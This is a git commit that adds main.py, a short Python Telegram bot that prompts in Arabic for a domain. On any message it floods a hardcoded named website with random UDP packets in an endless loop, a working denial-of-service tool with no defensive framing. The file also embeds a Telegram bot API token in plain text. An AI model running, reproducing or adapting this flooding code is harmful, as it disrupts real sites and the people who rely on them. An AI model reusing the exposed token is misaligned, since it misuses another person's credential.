cb096772261d86125ac831289a4f1a3ddd517cce
alihassandy <77039876+alihassandy@users.noreply.github.com>
2021-12-29 14:25:38 +0300

    Add files via upload

---
+++ main.py
@@ -0,0 +1,35 @@
+import socket
+
+import re
+
+import random
+
+import telebot
+
+bot = telebot.TeleBot("5036121723:AAFLo-MjCJjxs657KPnrnS1tEo3jm54phXw")
+
+print("- [ ! ] Bot Running Now .")
+
+@bot.message_handler(commands=['start'])
+def s(message):
+
+ bot.reply_to(message, "ارسل الدومين")
+
+@bot.message_handler(func=lambda m: True)
+def echo_all(message):
+
+ i = 0
+
+ sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+ bytes = random._urandom(1490)
+  
+ while True : 
+
+     sock.sendto(bytes, (socket.gethostbyname("ramy-essa.com"), 5000))
+
+     bot.reply_to(message, "ddos : ".format(i))
+     
+     i+=1 
+
+bot.polling(True)
